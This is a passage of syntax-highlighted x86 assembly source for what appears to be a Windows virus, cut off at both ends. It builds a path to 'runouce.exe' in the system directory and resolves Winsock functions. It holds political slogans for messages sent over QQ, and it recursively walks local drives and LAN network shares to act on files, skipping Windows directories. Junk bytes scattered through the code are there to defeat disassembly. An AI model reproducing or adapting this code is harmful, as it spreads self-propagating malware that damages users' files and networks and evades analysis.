</span><span class="sc5">PushWsApiStr07</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushWsApiStr06</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'socket'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushWsApiStr06</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushWsApiStr05</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'connect'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushWsApiStr05</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushWsApiStr04</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'gethostbyname'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushWsApiStr04</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushWsApiStr03</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'htons'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushWsApiStr03</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushWsApiStr02</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'send'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushWsApiStr02</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushWsApiStr01</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'WSACleanup'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushWsApiStr01</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushWsApiStr00</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'WSAStartup'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushWsApiStr00</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0e9h</span><span class="sc0">        </span><span class="sc1">;静态反汇编干扰</span><span class="sc0">

</span><span class="sc5">PushQQMsg</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0"> 
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushQQMsg00</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'枪毙李洪志!'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushQQMsg00</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushQQMsg01</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'去他妈的法轮功!'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushQQMsg01</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushQQMsg02</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'反对邪教,崇尚科学!'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushQQMsg02</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushQQMsg03</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'打倒本拉登!'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushQQMsg03</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushQQMsg04</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'向英雄王伟致意!'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushQQMsg04</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushQQMsg05</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'反对霸权主义!'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushQQMsg05</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushQQMsg06</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'世界需要和平!'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushQQMsg06</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushQQMsg07</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'社会主义好!'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushQQMsg07</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0"> 
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0e9h</span><span class="sc0">        </span><span class="sc1">;静态反汇编干扰</span><span class="sc0">

</span><span class="sc5">BuildVirusPathInStack</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc5">Stack</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">Stack</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlGetSystemDirectoryA</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetVirusFileName</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'\runouce.exe'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">GetVirusFileName</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">       </span><span class="sc1">;合成病毒路径名</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">BuildVirusPathInStack</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0e9h</span><span class="sc0">        </span><span class="sc1">;静态反汇编干扰</span><span class="sc0">

</span><span class="sc5">EnumLogDrive</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc1">;列举本地逻辑磁盘文件</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">24</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc12">'\:C'</span><span class="sc0">
</span><span class="sc5">ContEnumLogDrive</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlGetDriveTypeA</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">       </span><span class="sc1">;是不可访问磁盘</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ContNextLogDrive</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">       </span><span class="sc1">;是CDROM光盘</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ContNextLogDrive</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">EnumFileObject</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">  
</span><span class="sc5">ContNextLogDrive</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ContEnumLogDrive</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">EnumLogDrive</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0e9h</span><span class="sc0">        </span><span class="sc1">;静态反汇编干扰</span><span class="sc0">

</span><span class="sc5">EnumNetResource</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc1">;列举网络资源</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">;edi: NetData</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushEnumNetWorkGroup</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushEnumNetComputer</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushEnumNetComputerShareDir</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushEnumNetFile</span><span class="sc0">  
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">edi.lpRemoteName</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">EnumFileObject</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc1">;列举计算机共享目录里的文件</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0e9h</span><span class="sc0">        </span><span class="sc1">;静态反汇编干扰</span><span class="sc0">
</span><span class="sc5">PushEnumNetFile</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc1">;列举计算机共享目录</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">EnumNetObject</span><span class="sc4">,</span><span class="sc5">RESOURCEUSAGE_CONNECTABLE</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0e9h</span><span class="sc0">        </span><span class="sc1">;静态反汇编干扰</span><span class="sc0">
</span><span class="sc5">PushEnumNetComputerShareDir</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc1">;列举计算机</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">EnumNetObject</span><span class="sc4">,</span><span class="sc5">RESOURCEUSAGE_CONTAINER</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0e9h</span><span class="sc0">        </span><span class="sc1">;静态反汇编干扰</span><span class="sc0">
</span><span class="sc5">PushEnumNetComputer</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc1">;列举工作组</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">EnumNetObject</span><span class="sc4">,</span><span class="sc5">RESOURCEUSAGE_CONTAINER</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0e9h</span><span class="sc0">        </span><span class="sc1">;静态反汇编干扰</span><span class="sc0">
</span><span class="sc5">PushEnumNetWorkGroup</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc1">;列举网络根</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">EnumNetObject</span><span class="sc4">,</span><span class="sc5">RESOURCEUSAGE_CONTAINER</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0e9h</span><span class="sc0">        </span><span class="sc1">;静态反汇编干扰</span><span class="sc0">
</span><span class="sc5">EnumNetResource</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">EnumNetObject</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc5">Flag</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc4">,</span><span class="sc5">NetData</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc4">,</span><span class="sc5">CallBack</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0">  
    </span><span class="sc1">;用来列举局域网某种对象</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.MprWNetOpenEnumA</span><span class="sc4">],</span><span class="sc5">RESOURCE_GLOBALNET</span><span class="sc4">,</span><span class="sc5">RESOURCETYPE_DISK</span><span class="sc4">,</span><span class="sc5">Flag</span><span class="sc4">,</span><span class="sc5">NetData</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">   
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">     </span><span class="sc1">;弹出hEnum句柄,平衡堆栈</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">EnumNetObjectError</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc5">MAX_BUFF_SIZE</span><span class="sc1">;划分堆栈空间大小</span><span class="sc0">
</span><span class="sc5">LoopEnumNetObject</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">L</span><span class="sc0"> </span><span class="sc2">1h</span><span class="sc0">        </span><span class="sc1">;一次列举一个</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0"> 
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MAX_BUFF_SIZE</span><span class="sc0">   </span><span class="sc1">;缓冲区大小</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.MprWNetEnumResourceA</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">     </span><span class="sc1">;平衡堆栈</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">EnumNetObjectOver</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CallBack</span><span class="sc0">    </span><span class="sc1">;调用回调函数,利用edi,传递参数</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">LoopEnumNetObject</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0e9h</span><span class="sc0">        </span><span class="sc1">;静态反汇编干扰</span><span class="sc0">
</span><span class="sc5">EnumNetObjectOver</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.MprWNetCloseEnum</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc5">MAX_BUFF_SIZE</span><span class="sc0">
</span><span class="sc5">EnumNetObjectError</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">EnumNetObject</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0e9h</span><span class="sc0">        </span><span class="sc1">;静态反汇编干扰</span><span class="sc0">

</span><span class="sc5">EnumFileObject</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc5">BootDir</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0">
    </span><span class="sc1">;用来列举目录/网络上某个共享目录   </span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">BootDir</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">20202020h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'nniw'</span><span class="sc0">  </span><span class="sc1">;不感染WINN...目录</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">SetDirError</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'dniw'</span><span class="sc0">  </span><span class="sc1">;不感染WIND...目录</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">SetDirError</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlSetCurrentDirectoryA</span><span class="sc4">],</span><span class="sc5">BootDir</span><span class="sc0"> </span><span class="sc1">;设为当前目录</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">SetDirError</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FoundDirObject</span><span class="sc4">,</span><span class="sc5">BootDir</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc5">MAX_BUFF_SIZE</span><span class="sc1">;1000h字节的缓冲区</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc5">L</span><span class="sc0"> </span><span class="sc2">2a2e2ah</span><span class="sc0"> </span><span class="sc1">;建立"*.*"字符串</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlFindFirstFileA</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">EnumFileObjectError</span><span class="sc0">     
</span><span class="sc5">LoopEnumFileObject</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlFindNextFileA</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">EnumFileObjectOver</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">esp.cFileName</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esp.dwFileAttributes</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">     </span><span class="sc1">;测试文件属性</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">IsFileObject</span><span class="sc0">
</span><span class="sc5">IsDirObject</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc1">;是一个目录</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc0">      </span><span class="sc1">;测试是否点目录,是就不处理</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">LoopEnumFileObject</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">EnumFileObject</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc1">;递归调用</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">LoopEnumFileObject</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0e9h</span><span class="sc0">        </span><span class="sc1">;静态反汇编干扰</span><span class="sc0">
</span><span class="sc5">IsFileObject</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc1">;是一个文件</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FoundFileObject</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc1">;操作文件</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">LoopEnumFileObject</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0e9h</span><span class="sc0">        </span><span class="sc1">;静态反汇编干扰</span><span class="sc0">
</span><span class="sc5">EnumFileObjectOver</span><span class="sc4">:</span><span class="sc0">    
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlFindClose</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">EnumFileObjectError</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc5">L</span><span class="sc0"> </span><span class="sc2">2e2eh</span><span class="sc0">  </span><span class="sc1">;恢复原来的当前目录 建立字符串".."</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlSetCurrentDirectoryA</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc5">MAX_BUFF_SIZE</span><span class="sc1">;平衡堆栈</span><span class="sc0">
</span><span class="sc5">SetDirError</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">EnumFileObject</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0e9h</span><span class="sc0">        </span><span class="sc1">;静态反汇编干扰</span><span class="sc0">

</span><span class="sc5">FoundDirObject</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc5">DirName</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushOptDirError</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0e9h</span><span class="sc0">        </span><span class="sc1">;静态反汇编干扰</span><span class="sc0">
</span><span class="sc5">PushOptDirError</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">     </span><span class="sc1">;意外忽略设置</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetSehFrame</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFoundDirCallBackAddr</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc5">DirName</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">       </span><span class="sc1">;人工意外</span><span class="sc0">
</span><span class="sc5">FoundDirObject</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0e9h</span><span class="sc0">        </span><span class="sc1">;静 </span><span class="sc0">

</span><span class="sc5">FoundFileObject</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc5">FindData</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0">     
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushOptFileError</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0e9h</span><span class="sc0">        </span><span class="sc1">;静态反汇编干扰</span><span class="sc0">

</span><span class="sc5">PushOptFileError</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">     </span><span class="sc1">;意外忽略设置</span><span class="sc0">
